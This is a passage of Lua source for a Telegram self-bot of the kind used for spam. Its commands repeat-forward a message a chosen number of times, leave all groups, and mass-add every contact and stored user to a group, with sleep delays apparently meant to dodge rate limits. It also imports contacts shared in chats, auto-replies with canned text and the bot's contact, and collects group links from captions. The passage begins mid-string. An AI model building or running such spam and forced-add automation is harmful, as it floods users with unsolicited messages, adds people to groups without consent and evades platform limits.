\216\168\216\180\217\135\n \nOnline-Ping-\216\162\217\134\217\132\216\167\219\140\217\134\219\140\216\159\n\218\134\219\140 \216\168\218\175\217\133\216\159\216\167\216\178 \216\177\216\168\216\167\216\170 \216\168\217\190\216\177\216\179\n\nLeaveAllGp-\216\168\216\179\219\140\218\169 \216\167\216\178 \218\175\217\190\216\167-\216\168\217\132\217\129\216\170\n\217\129\216\177\216\167\216\177 \218\169\216\177\216\175\217\134 \216\167\216\178 \218\175\217\190\216\167\n\n\n\216\168\217\190\216\167\218\169 (\217\132\219\140\217\134\218\169\216\167\216\177\217\136/\217\133\216\174\216\167\216\183\216\168\216\167\216\177\217\136/\217\133\216\175\219\140\216\177\216\167\216\177\217\136)\n           \217\136\216\167\216\179\217\135 \216\167\219\140\217\134\217\133 \216\168\216\167\219\140\216\175 \216\170\217\136\216\182\219\140\216\173 \216\168\216\175\217\133\216\159\n\n\216\180\217\133\216\167\216\177\217\135 \217\135\216\167\216\177\217\136 \216\179\219\140\217\136 (\216\168\218\169\217\134/\217\134\218\169\217\134)\n\217\132\219\140\217\134\218\169\216\167\216\177\217\136 \217\190\219\140\216\175\216\167 (\216\168\218\169\217\134/\217\134\218\169\217\134)\n\217\132\219\140\217\134\218\169\216\167\216\177\217\136 \218\134\218\169 (\216\168\218\169\217\134/\217\134\218\169\217\134)\n\216\172\217\136\219\140\217\134 (\216\168\218\169\217\134/\217\134\218\169\217\134)\n            \216\174\216\172\216\167\217\132\216\170 \216\168\218\169\216\180\216\140 \217\135\219\140 \216\168\218\169\217\134 \216\168\218\169\217\134\n\n\216\168\216\180\217\136\216\170 (\218\169\216\181\216\180\216\177 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177)\n        \216\168\216\175\217\136\217\134 \217\129\217\136\216\177\217\136\216\167\216\177\216\175 \218\169\216\181\216\180\216\177\216\167\216\170\217\136\217\134\217\136 \216\168\217\129\216\177\216\179\216\170\219\140\216\175\n    \n\216\168\217\129\217\136\216\177 \216\170\217\136 (\218\175\217\190\216\167/\216\179\217\136\217\190\216\177\218\175\217\190\216\167/\217\190\219\140 \217\136\219\140)\n        \217\129\217\136\216\177\217\136\216\167\216\177\216\175 \218\169\216\177\216\175\217\134 \217\190\216\179\216\170 \217\133\216\179\216\174\216\177\216\170\n\n \nYou can send command with or with out: \n! or / or # or $ \nbefore command\n\n     \nDeveloped by @sudo_senator\nZEUSChannel @ZEUSKING\n"
          return send(msg.chat_id_, msg.id_, txt)
        elseif text:match("^(ZEUSSpm) (%d+)$") then
          local matches = text:match("%d+")
          local id = msg.reply_to_message_id_
          for i = 1, matches do
            return tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = msg.chat_id_,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 1,
              from_background_ = 1
            }, cb or dl_cb, cmd)
          end
        elseif tostring(msg.chat_id_):match("^-") then
          if text:match("^(\216\168\216\179\219\140\218\169 \216\167\216\178 \218\175\217\190\216\167)$") or text:match("^([Ll]eave[Aa]ll[Gg]p)$") or text:match("^(\216\168\217\132\217\129\216\170)$") then
            rem(msg.chat_id_)
            return tdcli_function({
              ID = "ChangeChatMemberStatus",
              chat_id_ = msg.chat_id_,
              user_id_ = bot_id,
              status_ = {
                ID = "ChatMemberStatusLeft"
              }
            }, cb or dl_cb, cmd)
          elseif text:match("^(\217\133\217\133\216\168\216\177 \216\168\217\190\216\167\218\134)$") or text:match("^([Aa]dd[Mm]embers)$") or text:match("^(\216\168 \216\167\216\175)$") then
            send(msg.chat_id_, msg.id_, "\216\174\216\168 \217\129\217\135\217\133\219\140\216\175\217\133. \217\135\216\177\217\136\217\130\216\170 \216\170\217\133\217\136\217\133 \216\180\216\175 \216\168\217\135\216\170 \217\133\219\140\218\175\217\133.\217\135\219\140 \216\175\216\179\216\170\217\136\216\177 \217\134\216\175\217\135")
            tdcli_function({
              ID = "SearchContacts",
              query_ = nil,
              limit_ = 999999999
            }, function(s, t)
              local users, count = redis:smembers("ZEUS:" .. Zeus_id .. ":users"), t.total_count_
              for n = 0, tonumber(count) - 1 do
                os.execute("sleep 5.39")
                tdcli_function({
                  ID = "AddChatMember",
                  chat_id_ = s.chat_id,
                  user_id_ = t.users_[n].id_,
                  forward_limit_ = 375
                }, cb or dl_cb, nil)
              end
              for n = 1, #users do
                os.execute("sleep 5.39")
                tdcli_function({
                  ID = "AddChatMember",
                  chat_id_ = s.chat_id,
                  user_id_ = users[n],
                  forward_limit_ = 375
                }, cb or dl_cb, nil)
              end
            end, {
              chat_id = msg.chat_id_
            })
            do return send(msg.chat_id_, msg.id_, "\216\170\217\133\217\136\217\133 \216\180\216\175.\216\168\219\140\216\180\216\170\216\177 \216\167\216\178 \216\167\219\140\217\134 \217\134\217\133\219\140\216\170\217\136\217\134\217\133 \216\167\216\175\216\175 \218\169\217\134\217\133 \216\173\217\133\216\167\217\132") end
            elseif msg.content_.ID == "MessageContact" and redis:get("ZEUS:" .. Zeus_id .. ":savecontacts") then
              local id = msg.content_.contact_.user_id_
              if not redis:sismember("ZEUS:" .. Zeus_id .. ":addedcontacts", id) then
                redis:sadd("ZEUS:" .. Zeus_id .. ":addedcontacts", id)
                local first = msg.content_.contact_.first_name_ or "-"
                local last = msg.content_.contact_.last_name_ or "-"
                local phone = msg.content_.contact_.phone_number_
                local id = msg.content_.contact_.user_id_
                tdcli_function({
                  ID = "ImportContacts",
                  contacts_ = {
                    [0] = {
                      phone_number_ = tostring(phone),
                      first_name_ = tostring(first),
                      last_name_ = tostring(last),
                      user_id_ = id
                    }
                  }
                }, cb or dl_cb, nil)
                if redis:get("ZEUS:" .. Zeus_id .. ":addcontact") and msg.sender_user_id_ ~= bot_id then
                  local fname = redis:get("ZEUS:" .. Zeus_id .. ":fname")
                  local lnasme = redis:get("ZEUS:" .. Zeus_id .. ":lname") or ""
                  local num = redis:get("ZEUS:" .. Zeus_id .. ":num")
                  os.execute("sleep 9.7")
                  tdcli_function({
                    ID = "SendMessage",
                    chat_id_ = msg.chat_id_,
                    reply_to_message_id_ = msg.id_,
                    disable_notification_ = 0,
                    from_background_ = 0,
                    reply_markup_ = nil,
                    input_message_content_ = {
                      ID = "InputMessageContact",
                      contact_ = {
                        ID = "Contact",
                        phone_number_ = num,
                        first_name_ = fname,
                        last_name_ = lname,
                        user_id_ = bot_id
                      }
                    }
                  }, cb or dl_cb, nil)
                end
              end
              if redis:get("ZEUS:" .. Zeus_id .. ":addmsg") then
                os.execute("sleep 9.3")
                local answer = redis:get("ZEUS:" .. Zeus_id .. ":addmsgtext") or "\216\167\216\179\218\169\217\132 \216\167\216\175\216\175\219\140 \218\175\217\133\216\180\217\136 \217\190\219\140 \217\136\219\140"
                send(msg.chat_id_, msg.id_, answer)
              end
            elseif msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == bot_id then
              return rem(msg.chat_id_)
            else
              if msg.content_.caption_ and redis:get("ZEUS:" .. Zeus_id .. ":link") then
                find_link(msg.content_.caption_)
              else
              end
            end
            elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
              tdcli_function({
                ID = "GetChats",
                offset_order_ = 9223372036854775807,
                offset_chat_id_ = 0,
                limit_ = 753
              }, cb or dl_cb, cmd)
            end
          end
        end
      else
      end
end
